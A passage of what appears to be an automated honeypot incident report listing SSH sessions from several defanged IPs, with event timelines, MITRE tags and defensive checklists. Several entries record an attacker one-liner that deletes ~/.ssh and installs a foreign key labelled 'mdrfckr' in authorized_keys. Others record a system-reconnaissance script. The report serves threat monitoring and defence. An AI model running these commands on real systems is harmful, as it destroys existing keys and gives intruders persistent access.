| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:16` | `cowrie.session.connect` |
| `2026-07-02 17:21:16` | `cowrie.client.version` |
| `2026-07-02 17:21:16` | `cowrie.client.kex` |
| `2026-07-02 17:21:17` | `cowrie.login.success` |
| `2026-07-02 17:21:18` | `cowrie.session.params` |
| `2026-07-02 17:21:18` | `cowrie.command.input` |
| `2026-07-02 17:21:18` | `cowrie.command.failed` |
| `2026-07-02 17:21:18` | `cowrie.log.closed` |
| `2026-07-02 17:21:19` | `cowrie.session.params` |
| `2026-07-02 17:21:19` | `cowrie.command.input` |
| `2026-07-02 17:21:19` | `cowrie.session.file_download` |
| `2026-07-02 17:21:19` | `cowrie.log.closed` |
| `2026-07-02 17:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.127.148[.]6` to AbuseIPDB if not already reported
- [ ] Block `220.127.148[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b62e8c6fb11

| Field | Detail |
|---|---|
| **Source IP** | `220.127.148[.]6` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:20` | `cowrie.session.connect` |
| `2026-07-02 17:21:20` | `cowrie.client.version` |
| `2026-07-02 17:21:20` | `cowrie.client.kex` |
| `2026-07-02 17:21:21` | `cowrie.login.success` |
| `2026-07-02 17:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.127.148[.]6` to AbuseIPDB if not already reported
- [ ] Block `220.127.148[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1789ba55a544

| Field | Detail |
|---|---|
| **Source IP** | `220.127.148[.]6` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:21` | `cowrie.session.connect` |
| `2026-07-02 17:21:21` | `cowrie.client.version` |
| `2026-07-02 17:21:21` | `cowrie.client.kex` |
| `2026-07-02 17:21:22` | `cowrie.login.success` |
| `2026-07-02 17:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.127.148[.]6` to AbuseIPDB if not already reported
- [ ] Block `220.127.148[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e212f2cb4802

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:32` | `cowrie.session.connect` |
| `2026-07-02 17:21:32` | `cowrie.client.version` |
| `2026-07-02 17:21:33` | `cowrie.client.kex` |
| `2026-07-02 17:21:34` | `cowrie.login.success` |
| `2026-07-02 17:21:35` | `cowrie.session.params` |
| `2026-07-02 17:21:35` | `cowrie.command.input` |
| `2026-07-02 17:21:35` | `cowrie.command.failed` |
| `2026-07-02 17:21:35` | `cowrie.log.closed` |
| `2026-07-02 17:21:36` | `cowrie.session.params` |
| `2026-07-02 17:21:36` | `cowrie.command.input` |
| `2026-07-02 17:21:37` | `cowrie.session.file_download` |
| `2026-07-02 17:21:37` | `cowrie.log.closed` |
| `2026-07-02 17:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac96f732a21b

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:37` | `cowrie.session.connect` |
| `2026-07-02 17:21:37` | `cowrie.client.version` |
| `2026-07-02 17:21:37` | `cowrie.client.kex` |
| `2026-07-02 17:21:38` | `cowrie.login.success` |
| `2026-07-02 17:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd6df72c9b3b

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:21:39` | `cowrie.session.connect` |
| `2026-07-02 17:21:39` | `cowrie.client.version` |
| `2026-07-02 17:21:39` | `cowrie.client.kex` |
| `2026-07-02 17:21:40` | `cowrie.login.success` |
| `2026-07-02 17:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3692d9bc73

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 17:23 |
| **Last Seen** | 2026-07-02 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:23:53` | `cowrie.session.connect` |
| `2026-07-02 17:23:53` | `cowrie.client.version` |
| `2026-07-02 17:23:53` | `cowrie.client.kex` |
| `2026-07-02 17:23:55` | `cowrie.login.success` |
| `2026-07-02 17:23:56` | `cowrie.session.params` |
| `2026-07-02 17:23:56` | `cowrie.command.input` |
| `2026-07-02 17:23:57` | `cowrie.log.closed` |
| `2026-07-02 17:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829633539f0c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:23 |
| **Last Seen** | 2026-07-02 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:23:57` | `cowrie.session.connect` |
| `2026-07-02 17:23:57` | `cowrie.client.version` |
| `2026-07-02 17:23:57` | `cowrie.client.kex` |
| `2026-07-02 17:23:57` | `cowrie.login.success` |
| `2026-07-02 17:23:58` | `cowrie.session.params` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.success` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.command.input` |
| `2026-07-02 17:23:58` | `cowrie.log.closed` |
| `2026-07-02 17:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c31bf455a6f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:25 |
| **Last Seen** | 2026-07-02 17:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:25:18` | `cowrie.session.connect` |
| `2026-07-02 17:25:19` | `cowrie.client.version` |
| `2026-07-02 17:25:19` | `cowrie.client.kex` |
| `2026-07-02 17:25:25` | `cowrie.login.success` |
| `2026-07-02 17:25:29` | `cowrie.session.params` |
| `2026-07-02 17:25:29` | `cowrie.command.input` |
| `2026-07-02 17:25:30` | `cowrie.log.closed` |
| `2026-07-02 17:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-275373ee4391

| Field | Detail |
|---|---|
| **Source IP** | `113.164.66[.]10` |
| **First Seen** | 2026-07-02 17:28 |
| **Last Seen** | 2026-07-02 17:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:28:06` | `cowrie.session.connect` |
| `2026-07-02 17:28:06` | `cowrie.client.version` |
| `2026-07-02 17:28:07` | `cowrie.client.kex` |
| `2026-07-02 17:28:08` | `cowrie.login.success` |
| `2026-07-02 17:28:09` | `cowrie.session.params` |
| `2026-07-02 17:28:09` | `cowrie.command.input` |
| `2026-07-02 17:28:09` | `cowrie.command.failed` |
| `2026-07-02 17:28:09` | `cowrie.log.closed` |
| `2026-07-02 17:28:10` | `cowrie.session.params` |
| `2026-07-02 17:28:10` | `cowrie.command.input` |
| `2026-07-02 17:28:10` | `cowrie.session.file_download` |
| `2026-07-02 17:28:10` | `cowrie.log.closed` |
| `2026-07-02 17:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.164.66[.]10` to AbuseIPDB if not already reported
- [ ] Block `113.164.66[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a2f3cfcc79

| Field | Detail |
|---|---|
| **Source IP** | `113.164.66[.]10` |
| **First Seen** | 2026-07-02 17:28 |
| **Last Seen** | 2026-07-02 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:28:11` | `cowrie.session.connect` |
| `2026-07-02 17:28:11` | `cowrie.client.version` |
| `2026-07-02 17:28:11` | `cowrie.client.kex` |
| `2026-07-02 17:28:12` | `cowrie.login.success` |
| `2026-07-02 17:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.164.66[.]10` to AbuseIPDB if not already reported
- [ ] Block `113.164.66[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e5140a0a63

| Field | Detail |
|---|---|
| **Source IP** | `113.164.66[.]10` |
| **First Seen** | 2026-07-02 17:28 |
| **Last Seen** | 2026-07-02 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:28:12` | `cowrie.session.connect` |
| `2026-07-02 17:28:12` | `cowrie.client.version` |
| `2026-07-02 17:28:13` | `cowrie.client.kex` |
| `2026-07-02 17:28:14` | `cowrie.login.success` |
| `2026-07-02 17:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.164.66[.]10` to AbuseIPDB if not already reported
- [ ] Block `113.164.66[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278e251083f8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:29 |
| **Last Seen** | 2026-07-02 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:29:09` | `cowrie.session.connect` |
| `2026-07-02 17:29:09` | `cowrie.client.version` |
| `2026-07-02 17:29:09` | `cowrie.client.kex` |
| `2026-07-02 17:29:09` | `cowrie.login.success` |
| `2026-07-02 17:29:10` | `cowrie.session.params` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.success` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.command.input` |
| `2026-07-02 17:29:10` | `cowrie.log.closed` |
| `2026-07-02 17:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178b94457876

| Field | Detail |
|---|---|
| **Source IP** | `211.253.31[.]30` |
| **First Seen** | 2026-07-02 17:32 |
| **Last Seen** | 2026-07-02 17:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:32:11` | `cowrie.session.connect` |
| `2026-07-02 17:32:11` | `cowrie.client.version` |
| `2026-07-02 17:32:11` | `cowrie.client.kex` |
| `2026-07-02 17:32:12` | `cowrie.login.success` |
| `2026-07-02 17:32:13` | `cowrie.session.params` |
| `2026-07-02 17:32:13` | `cowrie.command.input` |
| `2026-07-02 17:32:13` | `cowrie.command.failed` |
| `2026-07-02 17:32:13` | `cowrie.log.closed` |
| `2026-07-02 17:32:14` | `cowrie.session.params` |
| `2026-07-02 17:32:14` | `cowrie.command.input` |
| `2026-07-02 17:32:14` | `cowrie.session.file_download` |
| `2026-07-02 17:32:14` | `cowrie.log.closed` |
| `2026-07-02 17:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.31[.]30` to AbuseIPDB if not already reported
- [ ] Block `211.253.31[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71c4ce765b7

| Field | Detail |
|---|---|
| **Source IP** | `211.253.31[.]30` |
| **First Seen** | 2026-07-02 17:32 |
| **Last Seen** | 2026-07-02 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:32:14` | `cowrie.session.connect` |
| `2026-07-02 17:32:14` | `cowrie.client.version` |
| `2026-07-02 17:32:15` | `cowrie.client.kex` |
| `2026-07-02 17:32:15` | `cowrie.login.success` |
| `2026-07-02 17:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.31[.]30` to AbuseIPDB if not already reported
- [ ] Block `211.253.31[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bf6727b121

| Field | Detail |
|---|---|
| **Source IP** | `211.253.31[.]30` |
| **First Seen** | 2026-07-02 17:32 |
| **Last Seen** | 2026-07-02 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:32:16` | `cowrie.session.connect` |
| `2026-07-02 17:32:16` | `cowrie.client.version` |
| `2026-07-02 17:32:16` | `cowrie.client.kex` |
| `2026-07-02 17:32:17` | `cowrie.login.success` |
| `2026-07-02 17:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.31[.]30` to AbuseIPDB if not already reported
- [ ] Block `211.253.31[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b3a4a05c16

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:36 |
| **Last Seen** | 2026-07-02 17:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:36:55` | `cowrie.session.connect` |
| `2026-07-02 17:36:57` | `cowrie.client.version` |
| `2026-07-02 17:36:57` | `cowrie.client.kex` |
| `2026-07-02 17:37:03` | `cowrie.login.success` |
| `2026-07-02 17:37:06` | `cowrie.session.params` |
| `2026-07-02 17:37:06` | `cowrie.command.input` |
| `2026-07-02 17:37:08` | `cowrie.log.closed` |
| `2026-07-02 17:37:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edd1a7b764c

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 17:37 |
| **Last Seen** | 2026-07-02 17:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:37:52` | `cowrie.session.connect` |
| `2026-07-02 17:37:52` | `cowrie.client.version` |
| `2026-07-02 17:37:52` | `cowrie.client.kex` |
| `2026-07-02 17:37:53` | `cowrie.login.success` |
| `2026-07-02 17:37:55` | `cowrie.session.params` |
| `2026-07-02 17:37:55` | `cowrie.command.input` |
| `2026-07-02 17:37:56` | `cowrie.log.closed` |
| `2026-07-02 17:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b90539a9035

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:46 |
| **Last Seen** | 2026-07-02 17:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:46:08` | `cowrie.session.connect` |
| `2026-07-02 17:46:08` | `cowrie.client.version` |
| `2026-07-02 17:46:08` | `cowrie.client.kex` |
| `2026-07-02 17:46:10` | `cowrie.login.success` |
| `2026-07-02 17:46:11` | `cowrie.session.params` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.success` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:11` | `cowrie.command.input` |
| `2026-07-02 17:46:12` | `cowrie.log.closed` |
| `2026-07-02 17:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fd67bed8ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:47 |
| **Last Seen** | 2026-07-02 17:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
